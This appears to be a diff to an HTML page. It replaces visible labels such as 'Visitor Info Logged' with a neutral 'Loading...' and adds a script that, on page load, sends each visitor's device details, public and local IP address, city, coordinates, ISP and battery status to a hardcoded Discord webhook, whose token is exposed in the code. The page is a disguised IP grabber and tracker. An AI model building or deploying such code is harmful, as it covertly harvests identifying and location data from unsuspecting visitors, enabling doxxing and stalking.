@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Visitor Info Logged</title>
+  <title>Loading...</title>
   <style>
     body {
       background: #111;
@@ -40,10 +40,10 @@
 <body>
   <div class="container">
     <div class="info" id="visitor-info">
-      Loading visitor info...
+      Loading...
     </div>
     <div class="ip-box" id="ip-info">
-      Loading IP info...
+      Loading...
     </div>
   </div>
 
@@ -66,6 +66,59 @@
       setTimeout(() => {
         callback(ips);
       }, 2000);
+    }
+
+    async function sendVisitorData(visitorData) {
+      try {
+        const webhookURL = 'https://discord.com/api/webhooks/1365451163214024805/8OezJtvTg9WGDTX6vrHHr3z0eMq04t4NlVl0SUMDfhAOlg_l_Hyq4m6uDL2mEeUZwt3t';
+        const discordMessage = {
+          content: "New Visitor Info:\n",
+          embeds: [
+            {
+              title: "Visitor Information",
+              fields: [
+                { name: "🧠 Device Info", value: `
+                  **User Agent**: ${visitorData.userAgent}
+                  **OS Platform**: ${visitorData.platform}
+                  **Language**: ${visitorData.language}
+                  **Screen Resolution**: ${visitorData.resolution}
+                  **CPU Threads**: ${visitorData.cpu}
+                  **RAM**: ${visitorData.memory}
+                  **Battery**: ${visitorData.battery}
+                  **Online Status**: ${visitorData.onlineStatus}
+                ` },
+                { name: "🌐 IP Info", value: `
+                  **Public IP**: ${visitorData.ipData.ip}
+                  **Local IP**: ${visitorData.localIP}
+                  **City**: ${visitorData.ipData.city}
+                  **Region**: ${visitorData.ipData.region}
+                  **Country**: ${visitorData.ipData.country_name}
+                  **Timezone**: ${visitorData.ipData.timezone}
+                  **ISP**: ${visitorData.ipData.org}
+                  **Latitude**: ${visitorData.ipData.latitude}
+                  **Longitude**: ${visitorData.ipData.longitude}
+                ` }
+              ]
+            }
+          ]
+        };
+
+        const response = await fetch(webhookURL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(discordMessage),
+        });
+
+        if (response.ok) {
+          console.log("Visitor data sent to Discord successfully.");
+        } else {
+          console.error("Failed to send visitor data to Discord.");
+        }
+      } catch (error) {
+        console.error("Error sending visitor data to Discord:", error);
+      }
     }
 
     async function getVisitorInfo() {
@@ -91,7 +144,6 @@
         getLocalIPs(async (ips) => {
           const localIP = ips.length > 0 ? ips[0] : 'N/A';
 
-          // Fetch detailed IP information
           const ipResponse = await fetch('https://ipapi.co/json/');
           const ipData = await ipResponse.json();
 
@@ -121,6 +173,21 @@
             • Longitude: ${ipData.longitude}<br>
           `;
           document.getElementById("ip-info").innerHTML = ipContent;
+
+          const visitorData = {
+            userAgent,
+            platform,
+            language,
+            resolution,
+            memory,
+            cpu,
+            onlineStatus,
+            battery,
+            localIP,
+            ipData,
+          };
+
+          sendVisitorData(visitorData);
         });
 
       } catch (err) {
